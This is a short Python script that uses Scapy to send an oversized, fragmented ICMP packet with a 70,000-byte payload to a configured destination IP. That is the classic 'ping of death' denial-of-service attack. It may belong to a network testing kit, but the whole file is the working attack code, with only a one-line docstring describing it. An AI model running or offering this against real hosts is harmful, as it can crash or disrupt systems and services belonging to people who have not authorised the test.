#!venv/bin/python

from scapy.all import *
from scapy.all import Ether, IP, ICMP, fragment
import settings
"""
Send a ICMP packet with the size exceeding the IP datagram size
"""

frags = fragment(IP(src=settings.source_ip, dst=settings.destination_ip)/ICMP()/('X'*70000))

send(frags)